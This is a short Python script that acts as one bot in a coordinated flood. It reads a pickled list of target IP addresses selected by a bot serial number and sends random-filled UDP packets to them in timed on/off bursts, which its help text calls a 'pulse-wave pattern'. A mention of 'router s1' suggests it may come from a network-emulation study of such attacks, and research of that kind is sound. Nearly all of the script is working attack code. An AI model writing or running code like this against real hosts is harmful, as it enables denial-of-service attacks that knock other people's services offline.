import pickle
import socket
import random
from time import time, sleep
from argparse import ArgumentParser, Namespace

def randbytes(n: int) -> bytes:
    random_bytes = bytes(
        [random.getrandbits(8) for _ in range(0, n)]
    )
    return random_bytes

def run(serial, port, length, cycle, period, delay):
    total = 0
    data = randbytes(length)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    duration = period / 2 - delay
    for _ in range(cycle):
        start = time()
        while time() - start < duration:
            target = serial[total]
            s.sendto(data, (target, port))
            total += 1
            if total >= len(serial):
                break
            sleep(random.uniform(0.001, 0.003))
        sleep(period - time() + start)
        if total >= len(serial):
            break
    s.close()
    print(f"Sending {total} packets")

def main(args):
    serial = pickle.load(open(args.file, "rb"))
    print(f"serial {len(serial)}")
    serial = [row[args.serial] for row in serial]
    run(serial, args.port, args.length,
        args.cycle, args.period, args.delay)    
    
    return

def parse_args() -> Namespace:
    parser = ArgumentParser()
    parser.add_argument(
        "-f", "--file",
        type=str,
        required=True,
        help="Order of target hosts' IP addresses"
    )
    parser.add_argument(
        "-s", "--serial",
        type=int,
        required=True,
        help="Bot serial number"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=43355,
        help="Destination host port number"
    )
    parser.add_argument(
        "-l", "--length",
        type=int,
        default=1000,
        help="Length of the UDP packet"
    )
    parser.add_argument(
        "-T", "--period",
        type=int,
        default=4,
        help="The period of pulse-wave pattern"
    )
    parser.add_argument(
        "-c", "--cycle",
        type=int,
        default=5,
        help="The number of cycles to send packets"
    )
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=0,
        help="The latency from host to router s1"
    )
    args = parser.parse_args()

    return args


if __name__ == "__main__":
    args = parse_args()
    main(args)
